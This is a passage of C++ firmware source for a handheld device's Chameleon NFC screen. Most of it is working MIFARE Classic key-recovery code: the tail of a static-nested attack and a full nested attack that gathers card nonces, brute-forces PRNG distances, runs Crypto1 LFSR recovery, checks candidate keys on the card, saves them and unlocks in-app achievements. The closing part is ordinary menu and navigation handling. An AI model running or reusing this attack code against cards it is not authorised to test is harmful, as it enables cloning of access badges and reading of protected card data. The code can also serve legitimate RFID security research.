      if ((kt == 0) ? _foundA[targetSec] : _foundB[targetSec]) { done++; continue; }
      if ((int)targetSec == knownSec && tKType == knownKType)    { done++; continue; }

      _actionPct = totalTargets ? (done * 100) / totalTargets : 0;
      snprintf(_actionStatus, sizeof(_actionStatus), "S%d %c collect", targetSec, tkc);

      snprintf(m, sizeof(m), "──── target S%d %c block=%d ────",
               targetSec, tkc, (int)tBlock);
      _log(m, TFT_CYAN);

      // Firmware-side static-nested acquisition (cmd 2003) — silent retry,
      // single status redraw on success.
      ChameleonClient::NestedSample samples[2];
      int gotN = 0;
      bool collected = false;
      for (int attempt = 0; attempt < 3 && !collected; attempt++) {
        if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
        if (c.mf1StaticNestedAcquire(knownKType, exploitBlock, knownKeyBytes,
                                     tKType, tBlock, nullptr, samples,
                                     2, &gotN) && gotN >= 1) {
          collected = true;
          if (totalTargets) {
            _actionPct = (done * 100) / totalTargets + (100 / (2 * totalTargets));
            if (_actionPct > 100) _actionPct = 100;
          }
          snprintf(_actionStatus, sizeof(_actionStatus), "S%d %c acq", targetSec, tkc);
          _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
                          _actionStatusBarCb, this);
        }
      }
      if (!collected) {
        snprintf(m, sizeof(m), "S%d %c: acquire failed (firmware)", targetSec, tkc);
        _log(m, TFT_RED);
        done++; continue;
      }

      uint32_t staticNt = samples[0].nt;
      uint32_t encNt2   = samples[0].ntEnc;
      uint32_t ks       = encNt2 ^ staticNt;

      snprintf(_actionStatus, sizeof(_actionStatus), "S%d %c recover", targetSec, tkc);
      _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);

      Crypto1State* revstate = lfsr_recovery32(ks, staticNt ^ uid32);
      if (!revstate) {
        snprintf(m, sizeof(m), "S%d %c: lfsr null (Nt=%08lX ks=%08lX)",
                 targetSec, tkc, (unsigned long)staticNt, (unsigned long)ks);
        _log(m, TFT_RED);
        done++; continue;
      }

      // Count candidates produced (no per-candidate logging — that thrashes
      // the screen on cards with thousands of candidate states).
      int candCount = 0;
      for (Crypto1State* p = revstate; p->odd != 0 || p->even != 0; p++) {
        if (backRequested()) { free(revstate); cancelAttack(); return AdvancedAttackResult::Cancelled; }
        candCount++;
      }

      bool found = false;
      Crypto1State* rs = revstate;
      int checked = 0, verified = 0;
      while ((rs->odd != 0 || rs->even != 0) && !found) {
        if (backRequested()) { free(revstate); cancelAttack(); return AdvancedAttackResult::Cancelled; }
        lfsr_rollback_word(rs, staticNt ^ uid32, 0);
        uint64_t candKey64;
        crypto1_get_lfsr(rs, &candKey64);

        Crypto1State* test = crypto1_create(candKey64);
        crypto1_word(test, uid32 ^ staticNt, 0);
        uint32_t testKs = crypto1_word(test, 0, 0);
        crypto1_destroy(test);
        bool softOk = ((encNt2 ^ staticNt) == testKs);

        if (softOk) {
          uint8_t candBytes[6];
          uint64_t tmp = candKey64;
          for (int i = 5; i >= 0; i--) { candBytes[i] = (uint8_t)(tmp & 0xFF); tmp >>= 8; }
          verified++;

          if (c.mf1CheckKey(tBlock, tKType, candBytes)) {
            if (kt == 0) { memcpy(_keysA[targetSec], candBytes, 6); _foundA[targetSec] = true; }
            else         { memcpy(_keysB[targetSec], candBytes, 6); _foundB[targetSec] = true; }
            _recovered++; attackSummary.add(candBytes); if (_trackRecoveryKeys) _keySummary.add(candBytes); newKeys++; found = true;
          }
        }

        rs++;
        ++checked;
      }
      free(revstate);

      // ── Per-target summary line ──
      if (found) {
        uint8_t* k = (kt == 0) ? _keysA[targetSec] : _keysB[targetSec];
        snprintf(m, sizeof(m),
                 "S%d %c: KEY %02X%02X%02X%02X%02X%02X (cand=%d soft=%d)",
                 targetSec, tkc, k[0], k[1], k[2], k[3], k[4], k[5],
                 candCount, verified);
        _log(m, TFT_GREEN);
      } else {
        snprintf(m, sizeof(m), "S%d %c: no key (cand=%d soft=%d)",
                 targetSec, tkc, candCount, verified);
        _log(m, TFT_RED);
      }
      done++;
    }
  }

  char line1[40];
  snprintf(line1, sizeof(line1), "%u %s recovered", (unsigned)attackSummary.count,
           attackSummary.count == 1 ? "key" : "keys");
  char line2[40];
  snprintf(line2, sizeof(line2), "%u/%u sectors authenticated",
           (unsigned)_authenticatedSectors(), (unsigned)_sectors);
  strncpy(_actionStatus, line1, sizeof(_actionStatus) - 1);
  _actionStatus[sizeof(_actionStatus) - 1] = '\0';
  _actionPct = 100;
  _log(line1, attackSummary.count > 0 ? TFT_GREEN : TFT_YELLOW);
  _log(line2, TFT_WHITE);

  if (newKeys > 0) {
    _saveKeys();
    int n = Achievement.inc("chameleon_static_nested");
    if (n == 1) Achievement.unlock("chameleon_static_nested");
    Achievement.setMax("chameleon_mfc_keys_found", _recovered);
    if (_recovered >= 10) Achievement.unlock("chameleon_mfc_keys_found");
  }

  c.setMode(0);
  _running = false;
  _state = STATE_STATIC_NESTED_LOG;
  return AdvancedAttackResult::Completed;
}

// ── Nested Attack ─────────────────────────────────────────────────────────────

ChameleonMfcScreen::AdvancedAttackResult ChameleonMfcScreen::_callNestedAttack() {
  _state   = STATE_NESTED;
  _running = true;
  _actionLog.clear();
  _actionPct = 0;
  strncpy(_actionStatus, "Init...", sizeof(_actionStatus) - 1);
  render();

  auto& c = ChameleonClient::get();
  c.setMode(1);

  char m[80];

  // ── Find exploit key ──────────────────────────────────────────────────────
  int knownSec = -1;
  uint8_t knownKType = 0;
  uint64_t knownKey64 = 0;
  for (uint8_t s = 0; s < _sectors && knownSec < 0; s++) {
    if (_foundA[s]) {
      knownSec = s; knownKType = 0x60;
      for (int i = 0; i < 6; i++) knownKey64 = (knownKey64 << 8) | _keysA[s][i];
    } else if (_foundB[s]) {
      knownSec = s; knownKType = 0x61;
      for (int i = 0; i < 6; i++) knownKey64 = (knownKey64 << 8) | _keysB[s][i];
    }
  }
  if (knownSec < 0) {
    _log("No known key to exploit", TFT_RED);
    c.setMode(0);
    _running = false; _state = STATE_NESTED_LOG; return AdvancedAttackResult::Failed;
  }
  snprintf(m, sizeof(m), "Exploit: S%d %c key=%012llX",
           knownSec, knownKType == 0x60 ? 'A' : 'B', (unsigned long long)knownKey64);
  _log(m, TFT_CYAN);

  // ── PRNG check (must be dynamic for nested attack) ────────────────────────
  uint8_t ntLevel = 0;
  if (c.mf1NTLevel(&ntLevel)) {
    snprintf(m, sizeof(m), "NTLevel=%d %s", (int)ntLevel,
             ntLevel == 1 ? "(static — use Static Nested!)" :
             ntLevel == 2 ? "(weak PRNG — OK)" :
             ntLevel == 3 ? "(hardened — likely fail)" : "(unknown)");
    _log(m, ntLevel == 2 ? TFT_GREEN : TFT_YELLOW);
  }

  uint32_t uid32 = 0;
  for (int i = 0; i < 4 && i < (int)_uidLen; i++)
    uid32 = (uid32 << 8) | _uid[i];
  snprintf(m, sizeof(m), "uid32 = %08lX", (unsigned long)uid32);
  _log(m, TFT_DARKGREY);

  uint8_t exploitBlock = _trailerBlock((uint8_t)knownSec);
  uint8_t knownKeyBytes[6];
  { uint64_t tmp = knownKey64;
    for (int i = 5; i >= 0; i--) { knownKeyBytes[i] = (uint8_t)(tmp & 0xFF); tmp >>= 8; } }

  struct NestedSample { uint32_t nt1, encNt2; uint8_t par[3]; };
  static constexpr int COLLECT_NR = 3;
  NestedSample samples[COLLECT_NR];
  int newKeys = 0;
  MfcRecoverySummary attackSummary;

  int totalTargets = 0;
  for (uint8_t s = 0; s < _sectors; s++)
    for (int kt = 0; kt < 2; kt++)
      if (!((kt == 0) ? _foundA[s] : _foundB[s]))
        totalTargets++;
  int done = 0;
  // Poll navigation inside this synchronous attack: onUpdate() cannot run while _running.
  auto backRequested = [&]() -> bool {
    Uni.update();
    return Uni.Nav && Uni.Nav->wasPressed() &&
           Uni.Nav->readDirection() == INavigation::DIR_BACK;
  };
  auto cancelAttack = [&]() {
    if (newKeys > 0) _saveKeys();  // Retain keys already verified.
    _resumeReadAfterAttack = false; // Never resume Read Tag after cancellation.
    _trackRecoveryKeys = false;
    _chainStage[0] = 0;
    strncpy(_actionStatus, "Cancelled", sizeof(_actionStatus) - 1);
    _actionStatus[sizeof(_actionStatus) - 1] = '\0';
    _log("Cancelled", TFT_YELLOW);
    c.setMode(0);
    _running = false;
    _state = STATE_NESTED_LOG;
  };

  for (uint8_t targetSec = 0; targetSec < _sectors; targetSec++) {
    if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
    for (int kt = 0; kt < 2; kt++) {
      if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
      uint8_t tKType  = (kt == 0) ? 0x60 : 0x61;
      char    tkc     = (kt == 0) ? 'A'  : 'B';
      uint8_t tBlock  = _trailerBlock(targetSec);

      if ((kt == 0) ? _foundA[targetSec] : _foundB[targetSec]) { done++; continue; }
      if ((int)targetSec == knownSec && tKType == knownKType)    { done++; continue; }

      _actionPct = totalTargets ? (done * 100) / totalTargets : 0;

      snprintf(m, sizeof(m), "──── target S%d %c block=%d ────",
               targetSec, tkc, (int)tBlock);
      _log(m, TFT_CYAN);

      // ── Firmware-side nested acquisition (cmd 2006) ──
      // Each call returns multiple {nt, ntEnc, par} records in one BLE round
      // trip. We retry up to 4 times to gather at least COLLECT_NR samples.
      // No per-sample log/render here — that thrashes the screen. We tick the
      // status bar once per attempt and emit a single summary line at the end.
      int collected = 0;
      for (int attempt = 0; attempt < 4 && collected < COLLECT_NR; attempt++) {
        if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
        ChameleonClient::NestedSample fw[8];
        int got = 0;
        if (!c.mf1NestedAcquire(knownKType, exploitBlock, knownKeyBytes,
                                tKType, tBlock, fw, 8, &got) || got == 0) {
          continue;
        }
        for (int i = 0; i < got && collected < COLLECT_NR; i++) {
          samples[collected].nt1    = fw[i].nt;
          samples[collected].encNt2 = fw[i].ntEnc;
          // Firmware packs 4 parity-error bits into low nibble: bit3=byte0 .. bit0=byte3.
          // _isNonce only consumes bits 0..2 (= bytes 0,1,2 of encNt2).
          samples[collected].par[0] = (fw[i].par >> 3) & 1;
          samples[collected].par[1] = (fw[i].par >> 2) & 1;
          samples[collected].par[2] = (fw[i].par >> 1) & 1;
          collected++;
          if (totalTargets) {
            int sub = (collected * 100) / (COLLECT_NR * totalTargets);
            _actionPct = (done * 100) / totalTargets + sub;
            if (_actionPct > 100) _actionPct = 100;
          }
        }
        snprintf(_actionStatus, sizeof(_actionStatus), "S%d %c acq %d/%d",
                 targetSec, tkc, collected, COLLECT_NR);
        _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
                        _actionStatusBarCb, this);
      }

      if (collected == 0) {
        snprintf(m, sizeof(m), "S%d %c: no samples after %d attempts",
                 targetSec, tkc, 4);
        _log(m, TFT_RED);
        done++; continue;
      }

      // ── Enumerate 65535 PRNG distances using parity-disambiguating isNonce ──
      // Match details are summarized after the loop instead of logged per-hit.
      bool found = false;
      int matches = 0, recoveries = 0, recNull = 0;
      uint32_t firstMatchD = 0xFFFFFFFFu;
      uint32_t winningD    = 0;
      uint32_t lastTick    = 0;

      for (uint32_t d = 0; d < 65535 && !found; d++) {
        if ((d & 0x3F) == 0 && backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
        if ((d - lastTick) >= 8000) {
          lastTick = d;
          snprintf(_actionStatus, sizeof(_actionStatus),
                   "S%d %c d=%lu m=%d r=%d", targetSec, tkc,
                   (unsigned long)d, matches, recoveries);
          _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
                          _actionStatusBarCb, this);
        }

        uint32_t nt2_0  = prng_successor(samples[0].nt1, d);
        uint32_t ks1_0  = samples[0].encNt2 ^ nt2_0;
        if (!_isNonce(nt2_0, samples[0].encNt2, ks1_0, samples[0].par)) continue;

        bool allMatch = true;
        for (int i = 1; i < collected && allMatch; i++) {
          uint32_t nt2_i = prng_successor(samples[i].nt1, d);
          uint32_t ks1_i = samples[i].encNt2 ^ nt2_i;
          if (!_isNonce(nt2_i, samples[i].encNt2, ks1_i, samples[i].par)) allMatch = false;
        }
        if (!allMatch) continue;

        matches++;
        if (firstMatchD == 0xFFFFFFFFu) firstMatchD = d;

        Crypto1State* revstate = lfsr_recovery32(ks1_0, nt2_0 ^ uid32);
        if (!revstate) { recNull++; continue; }
        recoveries++;

        Crypto1State* rs = revstate;
        int checked = 0;
        while ((rs->odd != 0 || rs->even != 0) && !found) {
          if (backRequested()) { free(revstate); cancelAttack(); return AdvancedAttackResult::Cancelled; }
          lfsr_rollback_word(rs, nt2_0 ^ uid32, 0);
          uint64_t candKey64;
          crypto1_get_lfsr(rs, &candKey64);

          bool softOk = true;
          for (int i = 1; i < collected && softOk; i++) {
            uint32_t nt2_i = prng_successor(samples[i].nt1, d);
            Crypto1State* test = crypto1_create(candKey64);
            crypto1_word(test, uid32 ^ nt2_i, 0);
            uint32_t testKs = crypto1_word(test, 0, 0);
            crypto1_destroy(test);
            if ((samples[i].encNt2 ^ nt2_i) != testKs) softOk = false;
          }

          if (softOk) {
            uint8_t candBytes[6];
            uint64_t tmp = candKey64;
            for (int i = 5; i >= 0; i--) { candBytes[i] = (uint8_t)(tmp & 0xFF); tmp >>= 8; }

            if (c.mf1CheckKey(tBlock, tKType, candBytes)) {
              if (kt == 0) { memcpy(_keysA[targetSec], candBytes, 6); _foundA[targetSec] = true; }
              else         { memcpy(_keysB[targetSec], candBytes, 6); _foundB[targetSec] = true; }
              _recovered++; attackSummary.add(candBytes); if (_trackRecoveryKeys) _keySummary.add(candBytes); newKeys++; found = true; winningD = d;
            }
          }

          rs++;
          ++checked;
        }
        free(revstate);
      }

      // ── Per-target summary: one line in either outcome ──
      if (found) {
        // candBytes is no longer in scope here; rebuild from the stored key.
        uint8_t* k = (kt == 0) ? _keysA[targetSec] : _keysB[targetSec];
        snprintf(m, sizeof(m),
                 "S%d %c: KEY %02X%02X%02X%02X%02X%02X (d=%lu m=%d r=%d)",
                 targetSec, tkc, k[0], k[1], k[2], k[3], k[4], k[5],
                 (unsigned long)winningD, matches, recoveries);
        _log(m, TFT_GREEN);
      } else {
        snprintf(m, sizeof(m),
                 "S%d %c: no key (col=%d m=%d r=%d null=%d firstD=%lu)",
                 targetSec, tkc, collected, matches, recoveries, recNull,
                 firstMatchD == 0xFFFFFFFFu ? 0UL : (unsigned long)firstMatchD);
        _log(m, TFT_RED);
      }
      done++;
    }
  }

  char line1[40];
  snprintf(line1, sizeof(line1), "%u %s recovered", (unsigned)attackSummary.count,
           attackSummary.count == 1 ? "key" : "keys");
  char line2[40];
  snprintf(line2, sizeof(line2), "%u/%u sectors authenticated",
           (unsigned)_authenticatedSectors(), (unsigned)_sectors);
  strncpy(_actionStatus, line1, sizeof(_actionStatus) - 1);
  _actionStatus[sizeof(_actionStatus) - 1] = '\0';
  _actionPct = 100;
  _log(line1, attackSummary.count > 0 ? TFT_GREEN : TFT_YELLOW);
  _log(line2, TFT_WHITE);

  if (newKeys > 0) {
    _saveKeys();
    int n = Achievement.inc("chameleon_nested_attack");
    if (n == 1) Achievement.unlock("chameleon_nested_attack");
    Achievement.setMax("chameleon_mfc_keys_found", _recovered);
    if (_recovered >= 10) Achievement.unlock("chameleon_mfc_keys_found");
  }

  c.setMode(0);
  _running = false;
  _state = STATE_NESTED_LOG;
  return AdvancedAttackResult::Completed;
}

// ── Navigation ──

void ChameleonMfcScreen::onUpdate() {
  if (_running) return;

  if (_state == STATE_SHOW_KEYS) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) { Screen.goBack(); return; }
      _scrollView.onNav(dir);
    }
    return;
  }

  if (_state == STATE_READ_PREVIEW) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) { Screen.goBack(); return; }
      if (dir == INavigation::DIR_PRESS) {
        _showReadActions();
        return;
      }
      _scrollView.onNav(dir);
    }
    return;
  }

  if (_state == STATE_DUMP_RESULT) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        Screen.goBack();
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        _showDumpActions();
        return;
      }
      _scrollView.onNav(dir);
    }
    return;
  }

  if (_state == STATE_DUMP_HEX) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _state = STATE_DUMP_RESULT;
        _buildDumpPreview();
        render();
        return;
      }
      _scrollView.onNav(dir);
    }
    return;
  }

  if (_state == STATE_DICT_LOG) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) { _loadDictPicker(); return; }
      if (dir == INavigation::DIR_UP)   _actionLog.scroll(1);
      if (dir == INavigation::DIR_DOWN) _actionLog.scroll(-1);
      _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
    }
    return;
  }

  if (_state == STATE_STATIC_NESTED_LOG ||
      _state == STATE_NESTED_LOG) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) { Screen.goBack(); return; }
      if (dir == INavigation::DIR_PRESS) {
        Screen.goBack();
        return;
      }
      if (dir == INavigation::DIR_UP)   _actionLog.scroll(1);
      if (dir == INavigation::DIR_DOWN) _actionLog.scroll(-1);
      _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
    }
    return;
  }

  ListScreen::onUpdate();
}

void ChameleonMfcScreen::onRender() {
  if (_state == STATE_AUTH) {
    if (_waitingForTag) {
      TagPrompt::show("Waiting for tag...", bodyX(), bodyY(), bodyW(), bodyH());
      return;
    }
    _authLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _authStatusBarCb, this);
    return;
  }
  if (_state == STATE_SHOW_KEYS || _state == STATE_DUMP_RESULT ||
      _state == STATE_DUMP_HEX || _state == STATE_READ_PREVIEW) {
    _scrollView.render(bodyX(), bodyY(), bodyW(), bodyH());
    return;
  }
  if (_state == STATE_DICT_RUN         ||
      _state == STATE_DICT_LOG      || _state == STATE_STATIC_NESTED     ||
      _state == STATE_STATIC_NESTED_LOG || _state == STATE_NESTED        ||
      _state == STATE_NESTED_LOG) {
    _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
    return;
  }
  ListScreen::onRender();
}

void ChameleonMfcScreen::onItemSelected(uint8_t index) {
  if (_state == STATE_MF_MENU) {
    switch (index) {
      case 0: _showDiscoveredKeys();  break;
      case 1: _callDump();            break;
      case 2: _loadDictPicker();      break;
      case 3: _callStaticNested();    break;
      case 4: _callNestedAttack();    break;
      case 5:
        Screen.push(new ChameleonMfcDarksideScreen(_uid, _uidLen, _sectors, _foundA, _foundB));
        break;
    }
  } else if (_state == STATE_DICT_SEL) {
    _dictSource = "";
    if (_dictPickDir == _kDictDir) {
      int discovered = -1;
      for (uint8_t i = 0; i < _browser.count(); ++i)
        if (_browser.entry(i).path == MfcKeyStore::kDiscoveredDictionary) { discovered = i; break; }
      const uint8_t extendedIndex = 2;
      if (index == 0 || index == extendedIndex) {
        _dictSource = index == 0 ? MfcKeyStore::kBuiltinDefaultId : MfcKeyStore::kBuiltinExtendedId;
      } else {
        int fi = -1;
        if (index == 1) { _dictSource = MfcKeyStore::kDiscoveredDictionary; }
        else {
          uint8_t wanted = index - 3;
          for (uint8_t i = 0, seen = 0; i < _browser.count(); ++i) {
            if ((int)i == discovered) continue;
            if (seen++ == wanted) { fi = i; break; }
          }
        }
        if (!_dictSource.length()) {
          if (fi < 0) return;
          const auto& e = _browser.entry((uint8_t)fi);
          if (e.isDir) { _dictPickDir = e.path; _loadDictPicker(); return; }
          _dictSource = e.path;
        }
      }
    } else {
      if (index >= _browser.count()) return;
      const auto& e = _browser.entry(index);
      if (e.isDir) { _dictPickDir = e.path; _loadDictPicker(); return; }
      _dictSource = e.path;
    }
    const size_t count = MfcKeyStore::dictionaryKeyCount(Uni.Storage, _dictSource);
    if (!count) { ShowStatusAction::show("No valid keys", 1200); render(); return; }
    _dictKeyCount = (uint16_t)min(count, (size_t)UINT16_MAX);
    _dictAttackPending = true;
    _callAuth();
  }
}

void ChameleonMfcScreen::onBack() {
  switch (_state) {
    case STATE_MF_MENU:
      Screen.goBack(); break;
    case STATE_DICT_SEL: {
      // Clamp at _kDictDir — never climb above /unigeek/nfc/dictionaries.
      if (_dictPickDir == _kDictDir || _dictPickDir.length() == 0) {
        _dictPickDir = "";
        if (_resumeReadAfterAttack) {
          _resumeReadAfterAttack = false;
          _continueRead();
        } else {
          Screen.goBack();
        }
        return;
      }
      int slash = _dictPickDir.lastIndexOf('/');
      _dictPickDir = (slash > 0) ? _dictPickDir.substring(0, slash) : _kDictDir;
      _loadDictPicker();
      return;
    }
    case STATE_SHOW_KEYS:
    case STATE_STATIC_NESTED_LOG:
    case STATE_NESTED_LOG:
      Screen.goBack(); break;
    default:
      Screen.goBack(); break;
  }
}
